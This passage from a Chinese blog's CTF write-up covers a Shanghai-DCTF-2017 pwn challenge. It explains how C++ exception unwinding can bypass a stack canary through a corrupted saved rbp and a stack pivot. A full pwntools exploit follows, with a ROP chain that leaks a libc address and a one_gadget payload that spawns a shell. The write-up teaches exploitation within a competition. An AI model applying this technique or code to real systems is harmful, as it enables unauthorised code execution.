&amp;cur_context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> _Unwind_Reason_Code</span><br><span class="line">_Unwind_RaiseException_Phase2(struct _Unwind_Exception *exc,</span><br><span class="line">                  struct _Unwind_Context *context)</span><br><span class="line">&#123;</span><br><span class="line">  _Unwind_Reason_Code code;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _Unwind_FrameState fs;</span><br><span class="line">      <span class="keyword">int</span> match_handler;</span><br><span class="line"></span><br><span class="line">      code = uw_frame_state_for (context, &amp;fs);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Identify when we&#x27;ve reached the designated handler context.  */</span></span><br><span class="line">      match_handler = (uw_identify_context (context) == exc-&gt;private_2</span><br><span class="line">               ? _UA_HANDLER_FRAME : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">    <span class="comment">/* Some error encountered.  Usually the unwinder doesn&#x27;t</span></span><br><span class="line"><span class="comment">       diagnose these and merely crashes.  */</span></span><br><span class="line">      <span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fs.personality)</span><br><span class="line">      &#123;</span><br><span class="line">        code = (*fs.personality) (<span class="number">1</span>, _UA_CLEANUP_PHASE | match_handler,</span><br><span class="line">                    exc-&gt;exception_class, exc, context);</span><br><span class="line">        <span class="keyword">if</span> (code == _URC_INSTALL_CONTEXT)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND) </span><br><span class="line">          <span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Don&#x27;t let us unwind past the handler context.  */</span></span><br><span class="line">      <span class="keyword">if</span> (match_handler)</span><br><span class="line">         <span class="built_in">abort</span> ();</span><br><span class="line"></span><br><span class="line">      uw_update_context (context, &amp;fs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如上两个函数分别对应了 unwind 过程中的这两个阶段，注意其中的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bashuw_init_context()</span><br><span class="line">uw_frame_state_for()</span><br><span class="line">uw_update_context()</span><br></pre></td></tr></table></figure>
+<p>这几个函数主要是用来重建函数调用现场的，我们只需要知道它们的很大一部分上下文是可以从堆栈上恢复回来的,如 ebp, esp, 返回地址等。</p>
+<p>而这个时候，从栈中恢复保存的ebp值，是从<strong>sub_401148</strong>或者是从<strong>sub_401148</strong>的上一层函数的ebp呢？</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-16.jpg"></p>
+<p>其实从异常捕获结束后流程跳转到40155F我们就可以知道了，这里的leave，相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp;  恢复esp同时回收局部变量空间</span><br><span class="line">pop ebp;          从栈中恢复保存的ebp的值</span><br></pre></td></tr></table></figure>
+<p>这样一返回，就完全跳过了<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dcif-final-15.jpg"><br>canary 的检查</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>如果异常被上一个函数的catch捕获，所以rbp变成了上一个函数的rbp， 而通过构造一个payload把上一个函数的rbp修改成stack_pivot地址， 之后上一个函数返回的时候执行leave ret，这样一来我们就能成功绕过canary的检查</p>
+<p>而且进一步我们也能控制eip，，去执行了stack_pivot中的rop了</p>
+<h3 id="寻找stack-pivot"><a href="#寻找stack-pivot" class="headerlink" title="寻找stack_pivot"></a>寻找stack_pivot</h3><p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-18.jpg"></p>
+<p>如何去覆盖rbp呢?</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">message_pattern=<span class="number">0x6061C0</span></span><br><span class="line">ret=<span class="number">0x40150c</span>   </span><br><span class="line">payload1=p64(message_pattern)*<span class="number">37</span>+p64(ret)</span><br></pre></td></tr></table></figure>
+<p>构造如此的payload去覆盖rbp<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-19.jpg"></p>
+<p>紧接着我们是需要去做一个payload去做infoleak，所以我们利用栈溢出，构造puts 去打印puts_got,获取puts在内存中的地址..然后通过异常机制绕过canary…</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(message_pattern+<span class="number">0x50</span>)+p64(pop_rsi_r15)+p64(<span class="number">1024</span>)+p64(message_pattern+<span class="number">0x50</span>)+p64(readn)</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-20.jpg"></p>
+<p>调试过程中，我们也可以看到开始做infoleak了。。<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-21.jpg"></p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-22.jpg"></p>
+<p>当这个比较相等的时候，便能进入异常捕获的机制了…</p>
+<p>随后，我们就自然而然的跳过了canary的检查…然后我们只需要在构造一个read..写一个one_gadget_rce到stack_pivot上…然后控制返回地址回stack_pivot便能获取一个shell了…</p>
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./pwn.bak&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment">#def attach():</span></span><br><span class="line"><span class="comment">#    gdb.attach(io, execute=&quot;source bp&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;option:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;(yes/No)&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;No&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;(yes/No)&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;length:&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;break *0x400F45</span></span><br><span class="line"><span class="string">				 break *0x4012D4</span></span><br><span class="line"><span class="string">				 break *0x40153d&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">&#x27;-2&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;charset:&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;send payload 1 overwrite stack ebp --&gt; stack_pivot&quot;</span>)</span><br><span class="line">message_pattern=<span class="number">0x6061C0</span></span><br><span class="line">ret=<span class="number">0x40150c</span>   </span><br><span class="line">payload1=p64(message_pattern)*<span class="number">37</span>+p64(ret)  <span class="comment">#overwrite stack ebp --&gt; stack_pivot</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_plt=<span class="number">0x400BD0</span></span><br><span class="line">puts_got=<span class="number">0x606020</span></span><br><span class="line">readn=<span class="number">0x400F1E</span>  </span><br><span class="line">pop_rdi=<span class="number">0x4044d3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4044d1</span></span><br><span class="line">raw_input(<span class="string">&#x27;send payload 2 to leak puts addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(message_pattern+<span class="number">0x50</span>)+p64(pop_rsi_r15)+p64(<span class="number">1024</span>)+p64(message_pattern+<span class="number">0x50</span>)+p64(readn)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts(put@got) -&gt; readn_0x400f1e( stack_pivot + 0x50, 1024 ) one_gadget_addr to ret -&gt; one_gadget</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&quot;pattern:\n&quot;</span>)</span><br><span class="line">puts=io.recvuntil(<span class="string">&quot;\n&quot;</span>)[:<span class="number">-1</span>]</span><br><span class="line">puts=puts.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">puts=u64(puts)</span><br><span class="line">libc_base=puts-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0xF2519</span></span><br><span class="line">raw_input(<span class="string">&#x27;send payload3 with one gadget rce&#x27;</span>)</span><br><span class="line">payload3=p64(one_gadget)</span><br><span class="line"></span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#due to that the exception_handling program is define in func flex_md5_401500, faked ebp_save will be poped to ebp, when exception_handling program finishes, ip will be set to &#x27;leave retn&#x27; so we can control ip and stack(stack pivot in bss) than leak and exec.</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/catch/p/3604516.html">https://www.cnblogs.com/catch/p/3604516.html</a><br><a href="http://baiy.cn/doc/cpp/inside_exception.htm">http://baiy.cn/doc/cpp/inside_exception.htm</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E5%9C%BA%E5%85%A5%E5%9D%91"><span class="toc-number">1.1.</span> <span class="toc-text">现场入坑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E6%9C%BA"><span class="toc-number">1.2.</span> <span class="toc-text">转机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">C++异常机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C-%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E8%BF%94%E5%9B%9E"><span class="toc-number">2.1.</span> <span class="toc-text">C++ 函数的调用和返回</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E6%8A%9B%E5%87%BA"><span class="toc-number">2.2.</span> <span class="toc-text">异常抛出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E6%8D%95%E8%8E%B7%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.</span> <span class="toc-text">异常捕获机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E5%9B%9E%E9%80%80%EF%BC%88Stack-Unwind%EF%BC%89%E6%9C%BA%E5%88%B6"><span class="toc-number">2.4.</span> <span class="toc-text">栈回退（Stack Unwind）机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%8B%E8%BF%87%E7%A8%8B"><span class="toc-number">2.5.</span> <span class="toc-text">总结下过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unwind%E7%9A%84%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.6.</span> <span class="toc-text">unwind的做了什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEstack-pivot"><span class="toc-number">3.1.</span> <span class="toc-text">寻找stack_pivot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">4.</span> <span class="toc-text">完整exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&text=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&is_video=false&description=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shanghai-DCTF-2017 线下攻防Pwn题&body=Check out this article: https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&name=Shanghai-DCTF-2017 线下攻防Pwn题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&t=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
